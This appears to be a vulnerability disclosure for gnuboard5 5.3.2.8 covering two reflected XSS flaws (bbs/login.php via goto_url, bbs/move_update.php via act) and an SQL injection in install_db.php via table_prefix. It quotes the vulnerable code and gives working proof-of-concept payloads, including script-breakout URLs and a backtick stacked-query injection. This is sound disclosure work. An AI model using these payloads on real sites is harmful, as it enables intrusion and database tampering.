# gnuboard5-5.3.2.8 mul vuls

---

# limited Reflective xss in bbs/login.php

in bbs/login.php parameter `$url` only single quotes and double quotes are transferred.

and in function `check_url_host`, if url without start with http or https, the url parameter  will be treated as a path without any fiiter.

![image.png-48.9kB][1]

in functio0n `goto_url`

```
function goto_url($url)
{
    $url = str_replace("&amp;", "&", $url);
    //echo "<script> location.replace('$url'); </script>";

    if (!headers_sent())
        header('Location: '.$url);
    else {
        echo '<script>';
        echo 'location.replace("'.$url.'");';
        echo '</script>';
        echo '<noscript>';
        echo '<meta http-equiv="refresh" content="0;url='.$url.'" />';
        echo '</noscript>';
    }
    exit;
}
```

when `headers_sent()` return True，the parameter url will be directly spliced into javascript.

Although we can't use double quotes, we can escape directly with `</script>`

```
/bbs/login.php?url=www.baidu.com</script><script>alert(1)</script>
```

![image.png-15.6kB][2]

# Reflective xss in bbs/move_update.php

![image.png-140.1kB][3]

parameter `$act` input from common.php only single quotes and double quotes are transferred.

we can escape directly with `</script>`

```
act=12<%2fscript><script>alert(1)<%2fscript>
```

![image.png-63.7kB][4]


# SQL injection in install_db.php

parameter `$table_prefix` input from POST in install_db.php line 25

```
$table_prefix= safe_install_string_check($_POST['table_prefix']);
```

`$table_prefix` only be filtered by function `safe_install_string_check`. but function `safe_install_string_check` filter data without evil keyword which will lead to sql injection.

![image.png-276.2kB][5]

parameter `$table_prefix` will be inject into sql from gnuboard5.sql, we can use backquotes to close last sql. and inject a new sql to do anythings.

![image.png-247.4kB][6]

payload
```
mysql_host=localhost&mysql_user=root&mysql_pass=&mysql_db=g5&table_prefix=123`; select sleep(5)#
```

and then will sleep 5 secords.

![image.png-75.5kB][7]


  [1]: http://static.zybuluo.com/LoRexxar/e02bv2jkdb3gijhdcqat1rnm/image.png
  [2]: http://static.zybuluo.com/LoRexxar/vq2u6mgf9bun84pxsekmwgec/image.png
  [3]: http://static.zybuluo.com/LoRexxar/d6sentnepwpm0j32rjai3d3k/image.png
  [4]: http://static.zybuluo.com/LoRexxar/36tq8nzrov0p80fubntbemte/image.png
  [5]: http://static.zybuluo.com/LoRexxar/lx632ny1fi8y4mw9505ajuq8/image.png
  [6]: http://static.zybuluo.com/LoRexxar/aobinz82tf7pt5n9fjpbkgrd/image.png
  [7]: http://static.zybuluo.com/LoRexxar/gmozu557imphhf8srf2fugo2/image.png